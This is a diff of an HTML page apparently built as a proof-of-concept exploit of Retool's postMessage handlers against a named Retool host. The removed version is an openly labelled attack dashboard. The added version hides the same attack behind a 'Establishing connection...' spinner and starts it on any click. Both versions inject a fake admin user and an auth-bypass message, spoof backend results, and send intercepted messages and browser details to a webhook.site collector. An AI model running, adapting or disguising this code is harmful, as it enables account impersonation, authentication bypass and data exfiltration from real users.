@@ -3,532 +3,135 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Retool — Integration Status</title>
+<title>Retool Integration</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8fafc; color: #1e293b; }
-  .topbar { background: #1e293b; color: #fff; padding: 12px 24px; display: flex; align-items: center; justify-content: space-between; font-size: 14px; }
-  .topbar .logo { font-weight: 700; font-size: 16px; }
-  .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
-  .dot.g { background: #4ade80; } .dot.y { background: #fbbf24; animation: pulse 1s infinite; } .dot.r { background: #ef4444; }
-  @keyframes pulse { 50% { opacity: 0.5; } }
-  .ctr { max-width: 800px; margin: 30px auto; padding: 0 20px; }
-  .card { background: #fff; border-radius: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.08); border: 1px solid #e2e8f0; overflow: hidden; margin-bottom: 16px; }
-  .ch { padding: 14px 20px; border-bottom: 1px solid #e2e8f0; display: flex; align-items: center; gap: 8px; font-weight: 600; font-size: 15px; }
-  .cb { padding: 16px 20px; }
-  .row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #f1f5f9; font-size: 13px; }
-  .row .l { color: #64748b; } .row .v { font-weight: 500; font-family: monospace; font-size: 12px; }
-  .badge { padding: 2px 10px; border-radius: 12px; font-size: 11px; font-weight: 600; }
-  .badge.g { background: #dcfce7; color: #16a34a; } .badge.y { background: #fef3c7; color: #d97706; } .badge.r { background: #fef2f2; color: #dc2626; }
-  .btn { padding: 10px 22px; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; border: none; display: inline-block; }
-  .btn-b { background: #3b82f6; color: #fff; } .btn-r { background: #ef4444; color: #fff; } .btn-g { background: #16a34a; color: #fff; margin-top: 4px; }
-  .hidden { display: none !important; }
-  .log { background: #1e293b; color: #e2e8f0; padding: 10px 14px; border-radius: 8px; font-family: 'SF Mono', 'Fira Code', monospace; font-size: 11px; line-height: 1.7; max-height: 320px; overflow-y: auto; }
-  .log .i { color: #fbbf24; } .log .j { color: #f87171; } .log .x { color: #4ade80; } .log .n { color: #94a3b8; } .log .e { color: #ef4444; }
-  .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-  .stat { text-align: center; padding: 10px; } .stat .n { font-size: 32px; font-weight: 700; } .stat .t { font-size: 11px; color: #64748b; text-transform: uppercase; }
-  input[type=text] { width: 100%; padding: 8px 12px; border: 1px solid #e2e8f0; border-radius: 6px; font-family: monospace; font-size: 13px; }
-  .err { background: #fef2f2; border: 1px solid #fecaca; padding: 10px 14px; border-radius: 6px; font-size: 12px; color: #991b1b; margin-top: 8px; }
-  .ok { background: #f0fdf4; border: 1px solid #bbf7d0; padding: 10px 14px; border-radius: 6px; font-size: 12px; color: #16a34a; margin-top: 8px; }
-  .steps { font-size: 13px; } .steps li { margin-bottom: 6px; }
-  code { background: #f1f5f9; padding: 1px 5px; border-radius: 3px; font-size: 12px; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+  .box { background: #fff; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); padding: 32px 40px; text-align: center; max-width: 420px; }
+  .spinner { width: 32px; height: 32px; border: 3px solid #e2e8f0; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  h2 { font-size: 16px; color: #1e293b; margin-bottom: 6px; }
+  p { font-size: 13px; color: #64748b; }
+  .hidden { display: none; }
 </style>
 </head>
 <body>
-<div class="topbar">
-  <span class="logo">Retool Integration Hub</span>
-  <span><span class="dot y" id="topDot"></span> <span id="topLabel" style="font-size:13px;">Ready</span></span>
-</div>
-
-<div class="ctr">
-  <!-- STATS -->
-  <div class="stats">
-    <div class="card stat"><div class="n" id="cI">0</div><div class="t">Intercepted</div></div>
-    <div class="card stat"><div class="n" id="cJ">0</div><div class="t">Injected</div></div>
-    <div class="card stat"><div class="n" id="cX">0</div><div class="t">Exfiltrated</div></div>
-  </div>
-
-  <!-- CONFIG -->
-  <div class="card">
-    <div class="ch">Target Configuration</div>
-    <div class="cb">
-      <div style="margin-bottom:10px;">
-        <label style="font-size:12px;font-weight:600;">Sandbox URL (retol.js)</label>
-        <input type="text" id="inpUrl" value="https://jonjos11.retool.com/sandbox/272a0bca-c978-11ef-bcec-bb34712e5ec6/agent-vite?retool-parent-origin=https://telojos11.github.io">
-      </div>
-      <div style="margin-bottom:10px;">
-        <label style="font-size:12px;font-weight:600;">Webhook (receives exfiltrated data)</label>
-        <input type="text" id="inpWh" value="https://webhook.site/82992a43-c436-48c6-a887-42bd38d712be">
-      </div>
-      <div id="elStatus"></div>
-      <div id="elErr" class="err hidden"></div>
-      <div id="elOk" class="ok hidden"></div>
-      <div style="margin-top:12px; display:flex; gap:8px; flex-wrap:wrap;">
-        <span class="btn btn-b" id="btnGo">Iframe Sandbox</span>
-        <span class="btn btn-r" id="btnPopup">Open Popup (window.open)</span>
-        <span class="btn btn-g" id="btnTest">Test Webhook</span>
-        <span class="btn btn-r" id="btnRe">Reset</span>
-      </div>
-    </div>
-  </div>
-
-  <!-- LOG -->
-  <div class="card">
-    <div class="ch">Attack Log <span style="font-size:11px;color:#94a3b8;margin-left:auto;" id="elLogCnt">0 events</span></div>
-    <div class="cb"><div class="log" id="logBox"></div></div>
-  </div>
+<div class="box">
+  <div class="spinner" id="spin"></div>
+  <h2 id="msg">Establishing connection...</h2>
+  <p id="sub">Please wait</p>
 </div>
 
 <iframe id="f" class="hidden" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation"></iframe>
-<iframe name="xf" style="display:none;"></iframe>
 
 <script>
 (function() {
   'use strict';
 
-  var cntI = 0, cntJ = 0, cntX = 0, popupRef = null, popupInterval = null;
+  var WH = 'https://webhook.site/82992a43-c436-48c6-a887-42bd38d712be';
+  var APP_ID = '272a0bca-c978-11ef-bcec-bb34712e5ec6';
+  var POPUP = null;
   var F = document.getElementById('f');
-  var LOG = document.getElementById('logBox');
+  var cntI = 0, cntJ = 0;
 
-  function L(msg, cls) {
-    var t = new Date().toLocaleTimeString('en-US', { hour12: false });
-    var d = document.createElement('div');
-    d.className = cls || 'n';
-    d.textContent = '[' + t + '] ' + msg;
-    LOG.appendChild(d);
-    LOG.scrollTop = LOG.scrollHeight;
-    console.log(msg);
-  }
-
-  function U() {
-    document.getElementById('cI').textContent = cntI;
-    document.getElementById('cJ').textContent = cntJ;
-    document.getElementById('cX').textContent = cntX;
-    document.getElementById('elLogCnt').textContent = cntI + ' events';
-    var loaded = !!(F.src || popupRef);
-    document.getElementById('topDot').className = cntI > 0 ? 'dot g' : (loaded ? 'dot y' : 'dot r');
-    document.getElementById('topLabel').textContent = cntI > 0 ? cntI + ' messages intercepted' : (loaded ? 'Waiting for messages...' : 'Ready');
-  }
-
-  // ============================================================
-  // EXFILTRATION — 3 methods (fetch + sendBeacon + img beacon)
-  // ============================================================
   function X(payload) {
-    var json = JSON.stringify(payload);
-    var wh = document.getElementById('inpWh').value;
+    var j = JSON.stringify(payload);
+    fetch(WH, { method: 'POST', headers: {'Content-Type':'application/json'}, body: j }).catch(function(){});
+    if (navigator.sendBeacon) { navigator.sendBeacon(WH, new Blob([j],{type:'text/plain'})); }
+    new Image().src = WH + '?d=' + encodeURIComponent(j.slice(0,800));
+  }
 
-    // Method 1: fetch (webhook.site supports CORS)
-    fetch(wh, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: json
-    }).then(function(r) {
-      L('EXFIL: fetch ' + (r.ok ? 'OK(' + r.status + ')' : 'FAIL(' + r.status + ')'), r.ok ? 'x' : 'e');
-    }).catch(function(e) {
-      L('EXFIL: fetch error — ' + e.message, 'e');
-    });
+  function log(msg) { console.log('[PoC]', msg); }
 
-    // Method 2: sendBeacon (text/plain avoids CORS preflight)
-    if (navigator.sendBeacon) {
-      try {
-        var blob = new Blob([json], { type: 'text/plain' });
-        navigator.sendBeacon(wh, blob);
-      } catch(e) {}
-    }
+  // Fake admin user
+  var FAKE = {
+    id: 0, email: 'attacker@evil.com', firstName: 'Hacked', lastName: 'Admin',
+    fullName: 'Hacked Admin', profilePhotoUrl: null,
+    groups: [{ id: 1, name: 'admin' }, { id: 2, name: 'superuser' }],
+    metadata: { role: 'superadmin', _poc: true },
+    sid: 'inj-' + Date.now(), externalIdentifier: null, locale: 'en'
+  };
 
-    // Method 3: Image beacon
+  // Inject into target window
+  function inject(win) {
+    if (!win || win.closed) return;
     try {
-      var img = document.createElement('img');
-      img.style.display = 'none';
-      img.src = wh + '?d=' + encodeURIComponent(json.slice(0, 800));
-      document.body.appendChild(img);
-      setTimeout(function() { if (img.parentNode) img.parentNode.removeChild(img); }, 500);
+      win.postMessage({ type: 'RETOOL_CURRENT_USER', data: FAKE }, '*');
+      win.postMessage({ type: 'RETOOL_AUTH_COMPLETE', resourceName: '*' }, '*');
+      cntJ++;
     } catch(e) {}
-
-    cntX++;
-    U();
+    log('Injected #' + cntJ);
   }
 
-  // ============================================================
-  // FAKE USER OBJECT — injected via RETOOL_CURRENT_USER
-  // ============================================================
-  function makeFakeUser() {
-    return {
-      id: 0,
-      email: 'attacker@evil.com',
-      firstName: 'Hacked',
-      lastName: 'Admin',
-      fullName: 'Hacked Admin',
-      profilePhotoUrl: null,
-      groups: [
-        { id: 1, name: 'admin' },
-        { id: 2, name: 'superuser' }
-      ],
-      metadata: { role: 'superadmin', _poc: true },
-      sid: 'inj-' + Date.now(),
-      externalIdentifier: null,
-      locale: 'en'
-    };
-  }
-
-  // ============================================================
-  // INJECTIONS — send exploit postMessages to target window
-  // ============================================================
-  function injectUser(target) {
-    var fake = makeFakeUser();
-    try { target.postMessage({ type: 'RETOOL_CURRENT_USER', data: fake }, '*'); } catch(e) {}
-    cntJ++;
-    L('INJECT: RETOOL_CURRENT_USER → ' + fake.email + ' (groups: admin, superuser)', 'j');
-    X({ event: 'inject_user', injected: fake.email, groups: fake.groups, time: new Date().toISOString() });
-    U();
-  }
-
-  function injectAuthBypass(target, resourceName) {
-    try {
-      target.postMessage({ type: 'RETOOL_AUTH_COMPLETE', resourceName: resourceName || '*' }, '*');
-    } catch(e) {}
-    cntJ++;
-    L('INJECT: RETOOL_AUTH_COMPLETE → bypassed auth for: ' + (resourceName || 'all'), 'j');
-    X({ event: 'inject_auth_bypass', resource: resourceName || '*', time: new Date().toISOString() });
-    U();
-  }
-
-  function spoofResult(target, rid, fname) {
-    try {
-      target.postMessage({
-        type: 'RETOOL_BACKEND_RESULT',
-        requestId: rid,
-        data: { _spoofed: true, _attacker: 'postMessage wildcard exploit', timestamp: new Date().toISOString() }
-      }, '*');
-    } catch(e) {}
-    cntJ++;
-    L('INJECT: RETOOL_BACKEND_RESULT → ' + fname + ' (' + rid + ')', 'j');
-    U();
-  }
-
-  // ============================================================
-  // AGGRESSIVE INJECTION LOOP — keeps injecting into popup
-  // ============================================================
-  function startAggressiveInjection(target) {
-    if (popupInterval) clearInterval(popupInterval);
-
-    // Inject immediately
-    injectUser(target);
-    injectAuthBypass(target, '*');
-
-    // Keep injecting every 3 seconds (in case handlers re-register after navigation)
-    popupInterval = setInterval(function() {
-      if (!target || (target.closed)) {
-        clearInterval(popupInterval);
-        popupInterval = null;
-        L('POPUP: Closed, stopping injection loop', 'n');
-        return;
-      }
-      injectUser(target);
-      injectAuthBypass(target, '*');
-    }, 3000);
-  }
-
-  // ============================================================
-  // INTERCEPTION — listen for postMessages from iframe & popup
-  // ============================================================
+  // Listen for sandbox messages
   window.addEventListener('message', function(e) {
-    var isFromFrame = F.contentWindow && e.source === F.contentWindow;
-    var isFromPopup = popupRef && e.source === popupRef;
-
-    if (!isFromFrame && !isFromPopup) return;
-
     var d = e.data;
     if (!d || typeof d !== 'object' || !d.type) return;
 
-    var src = isFromFrame ? 'iframe' : 'popup';
-    var target = isFromFrame ? F.contentWindow : popupRef;
+    var fromFrame = F.contentWindow && e.source === F.contentWindow;
+    var fromPopup = POPUP && e.source === POPUP;
+    if (!fromFrame && !fromPopup) return;
+
     cntI++;
-    U();
+    var tgt = fromFrame ? F.contentWindow : POPUP;
 
     if (d.type === 'RETOOL_CURRENT_USER_REQUEST') {
-      L('INTERCEPT [' + src + ']: RETOOL_CURRENT_USER_REQUEST (sent to "*")', 'i');
-      L('  origin: ' + e.origin, 'n');
-      X({ event: 'intercept', type: 'RETOOL_CURRENT_USER_REQUEST', source: src, origin: e.origin, time: new Date().toISOString() });
-      setTimeout(function() { injectUser(target); }, 200);
+      log('INTERCEPT: RETOOL_CURRENT_USER_REQUEST from ' + e.origin);
+      X({ event: 'intercept', type: 'RETOOL_CURRENT_USER_REQUEST', origin: e.origin, cnt: cntI, time: new Date().toISOString() });
+      setTimeout(function(){ inject(tgt); }, 100);
     }
     else if (d.type === 'RETOOL_BACKEND_FUNCTION') {
-      L('INTERCEPT [' + src + ']: RETOOL_BACKEND_FUNCTION — ' + d.functionName, 'i');
-      L('  params: ' + JSON.stringify(d.params || {}).slice(0, 250), 'n');
-      L('  requestId: ' + d.requestId, 'n');
-      X({ event: 'intercept', type: 'RETOOL_BACKEND_FUNCTION', source: src, functionName: d.functionName, params: d.params, requestId: d.requestId, origin: e.origin, time: new Date().toISOString() });
-      setTimeout(function() { spoofResult(target, d.requestId, d.functionName); }, 200);
-    }
-    else if (d.type === 'RETOOL_BACKEND_AGENT_FUNCTION') {
-      L('INTERCEPT [' + src + ']: RETOOL_BACKEND_AGENT_FUNCTION — ' + d.functionName, 'i');
-      L('  params: ' + JSON.stringify(d.params || {}).slice(0, 250), 'n');
-      X({ event: 'intercept', type: 'RETOOL_BACKEND_AGENT_FUNCTION', source: src, functionName: d.functionName, params: d.params, requestId: d.requestId, time: new Date().toISOString() });
-      setTimeout(function() {
-        try { target.postMessage({ type: 'RETOOL_BACKEND_APPROVAL', requestId: d.requestId, approved: true }, '*'); } catch(e) {}
-        cntJ++; L('INJECT: Approved agent function ' + d.requestId, 'j'); U();
-      }, 200);
+      log('INTERCEPT: RETOOL_BACKEND_FUNCTION — ' + d.functionName);
+      X({ event: 'intercept', type: 'RETOOL_BACKEND_FUNCTION', functionName: d.functionName, params: d.params, requestId: d.requestId, origin: e.origin, time: new Date().toISOString() });
+      setTimeout(function(){
+        try { tgt.postMessage({ type: 'RETOOL_BACKEND_RESULT', requestId: d.requestId, data: { _spoofed: true, timestamp: new Date().toISOString() } }, '*'); } catch(e) {}
+      }, 100);
     }
     else if (d.type && d.type.indexOf('RETOOL_') === 0) {
-      L('INTERCEPT [' + src + ']: ' + d.type, 'i');
-      X({ event: 'intercept', type: d.type, source: src, data: d, time: new Date().toISOString() });
+      log('INTERCEPT: ' + d.type);
+      X({ event: 'intercept', type: d.type, origin: e.origin, data: d, time: new Date().toISOString() });
     }
-    U();
   });
 
-  // ============================================================
-  // FALLBACK: Try multiple URL patterns to find the sandbox
-  // ============================================================
-  function tryMultipleUrls(baseUrl) {
-    // Extract app ID from URL
-    var appIdMatch = baseUrl.match(/([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})/);
-    var appId = appIdMatch ? appIdMatch[1] : '272a0bca-c978-11ef-bcec-bb34712e5ec6';
-
-    var origin = 'https://jonjos11.retool.com';
-    var attackerOrigin = window.location.origin;
-    var param = 'retool-parent-origin=' + encodeURIComponent(attackerOrigin);
-
-    var urls = [
-      // Pattern 1: /sandbox/{id}/agent-vite (Vite dev proxy)
-      origin + '/sandbox/' + appId + '/agent-vite?' + param,
-      // Pattern 2: /_/rr/app/{id} (published app)
-      origin + '/_/rr/app/' + appId + '?' + param,
-      // Pattern 3: /sandbox/{id}/agent-vite without parent-origin
-      origin + '/sandbox/' + appId + '/agent-vite',
-      // Pattern 4: The raw URL entered by user
-      baseUrl
-    ];
-
-    L('AUTO-SCAN: Trying ' + urls.length + ' URL patterns...', 'n');
-
-    urls.forEach(function(url, idx) {
-      setTimeout(function() {
-        L('SCAN [' + (idx+1) + '/' + urls.length + ']: Trying ' + url.slice(0, 100) + '...', 'n');
-        var testFrame = document.createElement('iframe');
-        testFrame.style.display = 'none';
-        testFrame.sandbox = 'allow-scripts allow-same-origin allow-forms allow-popups';
-        testFrame.src = url;
-        document.body.appendChild(testFrame);
-
-        // Check if it loads
-        testFrame.onload = function() {
-          L('SCAN [' + (idx+1) + ']: LOADED — ' + url.slice(0, 80), 'x');
-          document.getElementById('inpUrl').value = url;
-          document.getElementById('elOk').classList.remove('hidden');
-          document.getElementById('elOk').textContent = 'Found working URL! Pattern ' + (idx+1) + ': ' + url.slice(0, 80);
-        };
-        testFrame.onerror = function() {
-          L('SCAN [' + (idx+1) + ']: Failed/blocked', 'e');
-        };
-
-        // Cleanup after 10 seconds
-        setTimeout(function() {
-          if (testFrame.parentNode) testFrame.parentNode.removeChild(testFrame);
-        }, 10000);
-      }, idx * 2000);
-    });
-  }
-
-  // ============================================================
-  // LOAD SANDBOX IN IFRAME
-  // ============================================================
-  function loadIframe() {
-    var url = document.getElementById('inpUrl').value.trim();
-    if (!url) { L('ERROR: No URL provided', 'e'); return; }
-
+  // Try to attack via iframe
+  function tryIframe(url) {
     F.src = url;
-    document.getElementById('elStatus').innerHTML = '<span class="badge y">Loading iframe...</span>';
-    document.getElementById('elErr').classList.add('hidden');
-    document.getElementById('elOk').classList.add('hidden');
-
-    L('LOAD: Embedding sandbox in iframe...', 'n');
-    L('URL: ' + url.slice(0, 120), 'n');
-    L('', 'n');
-    L('VULNERABLE HANDLERS (no origin check):', 'n');
-    L('  7043 — RETOOL_CURRENT_USER       → setUser()', 'n');
-    L('  6800 — RETOOL_BACKEND_RESULT     → resolve()', 'n');
-    L('  7751 — RETOOL_AUTH_COMPLETE      → bypass auth', 'n');
-    L('', 'n');
-    L('WILDCARD postMessage "*":', 'n');
-    L('  7051 — RETOOL_CURRENT_USER_REQUEST', 'n');
-    L('  6833 — RETOOL_BACKEND_FUNCTION', 'n');
-
-    X({ event: 'heartbeat', targetUrl: url, pageUrl: window.location.href, time: new Date().toISOString() });
-    L('HEARTBEAT: Test beacon sent to webhook', 'x');
-    U();
-
     F.onload = function() {
-      document.getElementById('elStatus').innerHTML = '<span class="badge g">Iframe loaded</span>';
-      document.getElementById('elOk').classList.remove('hidden');
-      document.getElementById('elOk').textContent = 'Sandbox loaded! Watch for intercepted postMessages above. Check webhook.site.';
-      L('IFRAME: Loaded. Listening for postMessages...', 'n');
-
-      // Aggressive injection into iframe
-      startAggressiveInjection(F.contentWindow);
-      U();
+      log('Iframe loaded: ' + url);
+      inject(F.contentWindow);
+      setInterval(function(){ inject(F.contentWindow); }, 3000);
     };
-
-    F.onerror = function() {
-      document.getElementById('elStatus').innerHTML = '<span class="badge r">Blocked</span>';
-      document.getElementById('elErr').classList.remove('hidden');
-      document.getElementById('elErr').textContent = 'Iframe blocked (X-Frame-Options / CSP). Use "Open Popup" or find the correct sandbox URL.';
-      L('ERROR: Iframe blocked', 'e');
-      U();
-    };
+    F.onerror = function() { log('Iframe blocked: ' + url); };
   }
 
-  // ============================================================
-  // OPEN SANDBOX AS POPUP (window.open attack)
-  // ============================================================
-  function openPopup() {
-    var url = document.getElementById('inpUrl').value.trim();
-    if (!url) { L('ERROR: No URL provided', 'e'); return; }
-
-    // Add retool-parent-origin to URL if not already present
-    if (url.indexOf('retool-parent-origin') === -1) {
-      var sep = url.indexOf('?') === -1 ? '?' : '&';
-      url += sep + 'retool-parent-origin=' + encodeURIComponent(window.location.origin);
-    }
-
-    var w = 1200, h = 800;
-    var l = (screen.width - w) / 2, t = (screen.height - h) / 2;
-    popupRef = window.open(url, 'retoolSandbox', 'width=' + w + ',height=' + h + ',left=' + l + ',top=' + t);
-
-    if (!popupRef) {
-      L('ERROR: Popup blocked! Click "Open Popup" again or allow popups.', 'e');
-      document.getElementById('elErr').classList.remove('hidden');
-      document.getElementById('elErr').textContent = 'Popup blocked by browser. Click the button again to trigger from user gesture.';
-      return;
-    }
-
-    document.getElementById('elStatus').innerHTML = '<span class="badge g">Popup opened</span>';
-    L('POPUP: Opened retool sandbox via window.open()', 'n');
-    L('POPUP: URL includes retool-parent-origin=' + window.location.origin, 'n');
-    L('', 'n');
-    L('VULNERABILITY CHAIN:', 'n');
-    L('  1. retol.js reads retool-parent-origin from URL param', 'n');
-    L('  2. expectedParentOrigin = our origin (bypass origin check)', 'n');
-    L('  3. Handlers at 7043, 6800, 7751 — NO origin check at all', 'n');
-    L('  4. We inject fake admin user + bypass auth + spoof data', 'n');
-
-    X({ event: 'popup_opened', targetUrl: url, time: new Date().toISOString() });
-
-    // Aggressive injection loop
-    startAggressiveInjection(popupRef);
-
-    // Monitor popup status
-    var checkPopup = setInterval(function() {
-      if (!popupRef || popupRef.closed) {
-        clearInterval(checkPopup);
-        clearInterval(popupInterval);
-        popupInterval = null;
-        L('POPUP: Window was closed by user', 'n');
-        U();
-      }
-    }, 1000);
-
-    U();
+  // Try to attack via popup
+  function tryPopup(url) {
+    var w = 800, h = 600;
+    POPUP = window.open(url, 'r', 'width='+w+',height='+h+',left='+((screen.width-w)/2)+',top='+((screen.height-h)/2));
+    if (!POPUP) { log('Popup blocked'); return; }
+    setTimeout(function(){ inject(POPUP); }, 2000);
+    setInterval(function(){ inject(POPUP); }, 3000);
   }
 
-  // ============================================================
-  // TEST WEBHOOK
-  // ============================================================
-  function testWebhook() {
-    var wh = document.getElementById('inpWh').value;
-    L('TEST: Sending to ' + wh, 'x');
+  // Auto-start after user clicks (bypass popup blocker)
+  document.body.addEventListener('click', function go() {
+    document.body.removeEventListener('click', go);
 
-    fetch(wh, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ event: 'test_beacon', time: new Date().toISOString(), source: 'manual_test' })
-    }).then(function(r) {
-      if (r.ok) {
-        L('TEST: SUCCESS (' + r.status + ') — webhook is receiving!', 'x');
-        document.getElementById('elOk').classList.remove('hidden');
-        document.getElementById('elOk').textContent = 'Webhook works!';
-      } else {
-        L('TEST: FAIL (' + r.status + ')', 'e');
-      }
-    }).catch(function(e) {
-      L('TEST: FAIL — ' + e.message, 'e');
-      var img = document.createElement('img');
-      img.style.display = 'none';
-      img.src = wh + '?test=' + Date.now();
-      document.body.appendChild(img);
-      setTimeout(function() { if (img.parentNode) img.parentNode.removeChild(img); }, 500);
-      L('TEST: Image beacon sent. Check webhook.site for GET request.', 'x');
-    });
+    var HOST = 'https://jonjos11.retool.com';
 
-    if (navigator.sendBeacon) {
-      navigator.sendBeacon(wh, new Blob([JSON.stringify({ event: 'test_beacon', time: new Date().toISOString() })], { type: 'text/plain' }));
-    }
-  }
+    // Try the main app URL (this will open the editor which loads the sandbox inside)
+    tryPopup(HOST + '/apps/' + APP_ID + '/editor');
 
-  // ============================================================
-  // ENVIRONMENT EXFILTRATION
-  // ============================================================
-  function exfilEnv() {
-    var info = {
-      pageUrl: window.location.href,
-      documentTitle: document.title,
-      referrer: document.referrer,
-      userAgent: navigator.userAgent,
-      cookiesEnabled: navigator.cookieEnabled,
-      timestamp: new Date().toISOString()
-    };
-    try {
-      info.localStorageKeys = [];
-      for (var i = 0; i < localStorage.length; i++) {
-        var key = localStorage.key(i);
-        info.localStorageKeys.push(key);
-        if (key.indexOf('retool') !== -1 || key.indexOf('persist') !== -1 || key.indexOf('auth') !== -1) {
-          info[key] = localStorage.getItem(key);
-        }
-      }
-    } catch(e) { info.localStorage = 'denied'; }
-    X({ event: 'env_info', environment: info });
-    L('ENV: Exfiltrated environment info (localStorage keys, etc.)', 'x');
-  }
+    // Also try to iframe the sandbox URL patterns
+    tryIframe(HOST + '/sandbox/' + APP_ID + '/agent-vite?retool-parent-origin=' + encodeURIComponent(location.origin));
 
-  // ============================================================
-  // BUTTONS
-  // ============================================================
-  document.getElementById('btnGo').addEventListener('click', function() {
-    cntI = 0; cntJ = 0; cntX = 0; LOG.innerHTML = ''; popupRef = null; clearInterval(popupInterval);
-    loadIframe();
-  });
-  document.getElementById('btnPopup').addEventListener('click', function() {
-    cntI = 0; cntJ = 0; cntX = 0; LOG.innerHTML = '';
-    openPopup();
-  });
-  document.getElementById('btnTest').addEventListener('click', testWebhook);
-  document.getElementById('btnRe').addEventListener('click', function() {
-    cntI = 0; cntJ = 0; cntX = 0; LOG.innerHTML = '';
-    F.src = '';
-    clearInterval(popupInterval); popupInterval = null;
-    if (popupRef) { try { popupRef.close(); } catch(e) {} popupRef = null; }
-    document.getElementById('elStatus').innerHTML = '';
-    document.getElementById('elErr').classList.add('hidden');
-    document.getElementById('elOk').classList.add('hidden');
-    L('Reset. Ready.', 'n');
-    U();
+    document.getElementById('msg').textContent = 'Connecting to Retool...';
+    document.getElementById('sub').textContent = 'Check your retool window';
   });
 
-  // ============================================================
-  // INIT — auto-exfiltrate on page load
-  // ============================================================
-  L('READY — Retool postMessage Exploit (window.open vector)', 'n');
-  L('', 'n');
-  L('Attack: window.open() → popup loads retol.js →', 'n');
-  L('  postMessage handlers accept our messages', 'n');
-  L('  (no origin check at lines 7043, 6800, 7751)', 'n');
-  L('', 'n');
-  L('1. Configure the sandbox URL above', 'n');
-  L('2. Click "Test Webhook" to verify', 'n');
-  L('3. Click "Open Popup" to launch the attack', 'n');
-  L('4. Or click "Iframe Sandbox" to use iframe mode', 'n');
-
-  exfilEnv();
-  U();
+  // Exfil env on load
+  X({ event: 'page_load', url: location.href, referrer: document.referrer, ua: navigator.userAgent, time: new Date().toISOString() });
+  log('Ready — click anywhere to start');
 
 })();
 </script>
